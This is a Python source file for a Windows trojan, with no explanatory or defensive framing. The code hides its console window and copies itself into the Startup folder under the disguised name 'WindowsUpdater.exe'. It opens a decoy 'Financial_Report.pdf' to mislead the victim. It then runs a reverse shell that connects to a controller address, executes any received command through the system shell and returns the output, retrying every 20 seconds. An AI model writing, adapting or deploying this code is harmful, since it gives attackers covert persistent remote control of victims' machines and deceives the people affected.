import socket
import subprocess
import platform
import time
import os
import sys
import shutil

# --- 1. RESOURCE BUNDLING HELPER ---
def get_resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# --- 2. PERSISTENCE: Copy to Startup ---
def add_to_startup():
    if platform.system().lower() == "windows":
        # Path to the Windows Startup folder
        startup_path = os.path.join(os.getenv('APPDATA'), 
                                    r'Microsoft\Windows\Start Menu\Programs\Startup')
        # Name the persistent file something believable
        target_file = os.path.join(startup_path, "WindowsUpdater.exe")
        
        # If the script isn't already in the startup folder, copy itself there
        if not os.path.exists(target_file):
            try:
                shutil.copyfile(sys.executable, target_file)
            except:
                pass

# --- 3. STEALTH: Hide Console (From your notes) ---
def hide_window():
    if platform.system().lower() == "windows":
        import ctypes
        window = ctypes.windll.kernel32.GetConsoleWindow()
        if window != 0:
            ctypes.windll.user32.ShowWindow(window, 0)

# --- 4. DECOY: Open real document ---
def open_decoy():
    decoy_path = get_resource_path("Financial_Report.pdf")
    if os.path.exists(decoy_path):
        os.startfile(decoy_path)

# --- 5. CORE: Reverse Shell ---
def connect():
    CONTROLLER_IP = "192.168.1.5" # Change to your Machine A IP
    PORT = 87 

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((CONTROLLER_IP, PORT))
            
            while True:
                command = s.recv(1024).decode("utf-8")
                if not command or command.lower().strip() == "exit":
                    break
                
                op = subprocess.Popen(command, shell=True, 
                                      stdout=subprocess.PIPE, 
                                      stderr=subprocess.PIPE, 
                                      stdin=subprocess.PIPE)
                s.send(op.stdout.read() + op.stderr.read())
            s.close()
        except:
            time.sleep(20) # Retry every 20 seconds if connection fails

if __name__ == "__main__":
    hide_window()
    # Persistence runs first to ensure it stays on the system
    add_to_startup()
    # Decoy only opens if it's the first time running (not from startup)
    if "Startup" not in sys.executable:
        open_decoy()
    connect()
